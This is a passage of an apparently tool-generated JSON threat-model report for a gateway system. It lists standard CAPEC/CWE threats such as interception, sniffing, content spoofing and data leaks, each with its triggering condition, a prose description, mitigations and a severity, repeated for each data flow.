allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "295", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "CLI connects to Gateway WS/HTTP", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "296", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "CLI connects to Gateway WS/HTTP", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "297", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "CLI connects to Gateway WS/HTTP", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "298", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "CLI connects to Gateway WS/HTTP", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "299", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "UI connects to Gateway WS", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "300", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "UI connects to Gateway WS", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "301", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "UI connects to Gateway WS", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "302", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "UI connects to Gateway WS", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "303", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "UI connects to Gateway WS", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "304", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "UI connects to Gateway WS", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "305", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "UI connects to Gateway WS", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "306", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "External client uses Gateway HTTP APIs", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "307", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "External client uses Gateway HTTP APIs", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "308", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "External client uses Gateway HTTP APIs", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "309", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "External client uses Gateway HTTP APIs", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "310", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "External client uses Gateway HTTP APIs", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "311", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "External client uses Gateway HTTP APIs", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "312", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "External client uses Gateway HTTP APIs", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "313", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "End user sends channel message", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "314", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "End user sends channel message", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "315", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "End user sends channel message", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "316", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "End user sends channel message", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "317", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "End user sends channel message", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "318", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "End user sends channel message", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "319", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "End user sends channel message", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "320", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Inbound channel events to Gateway", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "321", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Inbound channel events to Gateway", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "322", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Inbound channel events to Gateway", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that 